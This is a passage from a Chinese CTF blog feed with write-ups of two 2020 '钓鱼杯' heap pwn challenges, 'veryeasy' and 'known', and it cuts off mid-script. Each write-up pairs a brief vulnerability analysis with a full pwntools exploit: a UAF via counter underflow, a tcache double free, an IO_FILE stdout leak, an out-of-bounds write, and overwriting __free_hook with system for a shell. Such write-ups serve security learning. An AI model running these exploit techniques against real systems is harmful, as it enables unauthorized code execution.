class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> abs漏洞 </tag>
            
            <tag> overlapping </tag>
            
            <tag> unlink </tag>
            
            <tag> 爆破libc </tag>
            
            <tag> glibc 2.23 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-钓鱼杯</title>
      <link href="/2020/08/30/2020-diao-yu-bei/"/>
      <url>/2020/08/30/2020-diao-yu-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h1><h2 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/0.png"></div>保护全开，2.27 libc**考点：**2.27 double free，io file attack<h2 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/1.png"></div>标准的菜单题，有创建、编辑、删除，没有打印信息功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/2.png"></div>创建功能，这里就是标准的创建信息，但是有个参数减一的操作<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/3.png"></div>编辑功能，这也是个标准的编辑功能，没有漏洞，后面有个参数减一的操作<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/4.png"></div>删除功能，我们可以看到这里有个UAF漏洞<h2 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>UAF漏洞，但是删除操作前会进行一个参数比较，delete参数为flag2，cretae和edit所用的参数是flag1，即：flag2&lt;flag1。但是我们看到flag1是unsigned int，所以先一直分配将flag1变成负数，那么就可以无限删除了。</p><p><strong>第一步</strong>：先不断create，将flag1参数下溢，就可以无限分配<br><strong>第二步</strong>：利用double free，将某个chunk同时释放到unsorted bin和tcache中<br><strong>第三步</strong>：利用UAF，将某个chunk的fd（此时有libc地址），改为<em>2</em>1_IO_stdout_需要1/16爆破<br><strong>第四步</strong>：IO file attak攻击泄露libc地址<br><strong>第五步</strong>：再来一次Double free和UAF将malloc_hook改为system，执行delete(“/bin/sh”)</p><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>iat     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"122.112.225.164"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"\x60\xc7"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd18b0</span><span class="token operator">+</span><span class="token number">0x7ffff79e4000</span>    success<span class="token punctuation">(</span><span class="token string">"libc ==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    sla<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"122.112.225.164"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn4"</span><span class="token punctuation">)</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="known"><a href="#known" class="headerlink" title="known"></a>known</h1><h2 id="0x01-查看文件-1"><a href="#0x01-查看文件-1" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/5.png"></div>保护全开，2.27 libc**考点：** 越界读写、考到一些逆向的知识<h2 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>这个题按照Q1lQ大佬的说法是由于运行前对函数地址进行了异或加密，如果将其还原就可以正常反编译看伪代码了，但目前还不知道怎么还原，一会儿请教征哥。</p><h2 id="0x03-思路-1"><a href="#0x03-思路-1" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>漏洞是越界写，那么可以通过create一个index为负数的chunk，来将chunk地址写到size位置，那么几乎就等于无限溢出了。</p><p>第一步：通过越界写的时候将下一个chunk的size改为0x420，并删除（注意content不能为\x00，应该是top chunk的位置会检查size是否为空）</p><p>第二步：删除被修改size的chunk，产生libc地址，由于show的逻辑是没有遇到\x00就一直打印，所以从大chunk中切出来的小chun需要编辑一下再show出libc地址。</p><p>第三步：再溢出一次改fd为hook，就可以编辑hook来getshell了。</p><h2 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>iat     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./unknown"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./unknown"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"122.112.212.41"</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./unknown"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x418</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"1\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd0a31</span><span class="token operator">+</span><span class="token number">0x7ffff79e4000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token 